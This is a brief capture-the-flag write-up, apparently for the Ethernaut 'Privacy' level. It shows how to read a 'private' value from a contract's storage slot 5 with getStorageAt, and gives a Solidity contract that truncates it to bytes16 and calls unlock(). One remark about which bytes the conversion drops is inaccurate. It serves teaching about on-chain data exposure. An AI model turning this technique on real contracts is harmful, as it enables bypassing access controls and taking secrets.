#Privacy

First we need to find out what storage index the data at index 2 is stored.
We see that the boolean takes storage slot 0, the uint256 takes slot 1,
the uint8, uint8, and uint16 take slot 2, bytes[0] takes slot 3,
bytes[1] takes slot 4, and bytes[2] takes slot 5. Knowing this we can
get the bytes data in bytes[2] with web3 ethers.

> await web3.eth.getStorageAt("0x1423b1a6Ef076E816f00c5FdB0274474C10E76e7", "5")

This returns the bytes32 and we simply make a contract that does the conversion from
bytes 32 to bytes16 and pass it as the parameter for the unlock.

Another option is to remove the last 16 bytes of the data since a conversion of bytes
cuts higher order data.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IPrivacy {
    function unlock(bytes16) external;
}

contract Unlocker {
    address immutable i_privacyAddress;
    constructor(address _privacyAddress) {
        i_privacyAddress = _privacyAddress;
    }

    function unlocker(bytes32 storageData) public {
        bytes16 key = bytes16(storageData);
        IPrivacy(i_privacyAddress).unlock(key);
    }
}
```
